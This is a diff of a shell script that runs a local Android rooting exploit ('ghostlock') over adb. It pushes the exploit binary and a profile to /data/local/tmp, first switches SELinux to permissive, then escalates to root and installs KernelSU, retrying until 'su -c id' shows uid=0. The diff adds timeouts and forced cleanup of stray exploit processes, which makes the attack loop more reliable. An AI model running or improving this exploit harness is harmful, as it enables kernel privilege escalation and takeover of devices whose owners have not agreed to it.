@@ -90,6 +90,22 @@ wait_device() {
     done
 }
 
+# A parked rooted child keeps the adb shell's stdout open, so a failed handoff
+# can block forever. Bound every exploit invocation and reap leftovers.
+adb_shell_timeout() {
+    local secs=$1
+    shift
+    if [ -n "$SERIAL" ]; then
+        timeout "$secs" adb -s "$SERIAL" shell "$@"
+    else
+        timeout "$secs" adb shell "$@"
+    fi
+}
+
+cleanup_strays() {
+    adb_target shell 'pkill -9 -f /data/local/tmp/ghostlock 2>/dev/null; pkill -9 ghostleaf 2>/dev/null; true' >/dev/null 2>&1
+}
+
 push_all() {
     resolve_profile || exit 1
     [ -f "$BIN" ] || { echo "!! missing binary: $BIN (build it on the build machine and copy it back)"; exit 1; }
@@ -124,6 +140,7 @@ ATTEMPT=0
 while true; do
     ATTEMPT=$((ATTEMPT+1))
     wait_device
+    cleanup_strays
 
     # Already rooted: nothing to do
     if adb_target shell "su -c id" 2>/dev/null | grep -q "uid=0"; then
@@ -136,7 +153,8 @@ while true; do
         # phase 1: W1 -> permissive
         echo "== attempt $ATTEMPT: W1 (SELinux) $(date '+%H:%M:%S')"
         push_all
-        adb_target shell "cd /data/local/tmp && ./ghostlock --load-prebuilt-profile /data/local/tmp/profile.bin --stop-after-w1" > /dev/null 2>&1
+        adb_shell_timeout 240 "cd /data/local/tmp && ./ghostlock --load-prebuilt-profile /data/local/tmp/profile.bin --stop-after-w1" > /dev/null 2>&1
+        cleanup_strays
         ENF=$(adb_target shell "cat /sys/fs/selinux/enforce" 2>/dev/null | tr -d '\r')
         if [ "$ENF" != "0" ]; then
             echo "   W1 missed (the device may have rebooted; waiting for reconnect...)"
@@ -151,8 +169,10 @@ while true; do
         wait_device
         ENF=$(adb_target shell "cat /sys/fs/selinux/enforce" 2>/dev/null | tr -d '\r')
         [ "$ENF" != "0" ] && break   # rebooted; back to phase 1
+        echo "   W2 try $i/25 $(date '+%H:%M:%S')"
         push_all
-        adb_target shell "cd /data/local/tmp && ./ghostlock --load-prebuilt-profile /data/local/tmp/profile.bin" > /dev/null 2>&1
+        adb_shell_timeout 240 "cd /data/local/tmp && ./ghostlock --load-prebuilt-profile /data/local/tmp/profile.bin" > /dev/null 2>&1
+        cleanup_strays
         if adb_target shell "su -c id" 2>/dev/null | grep -q "uid=0"; then
             echo "== ROOTED + KernelSU active (attempt $ATTEMPT, try $i)"
             exit 0
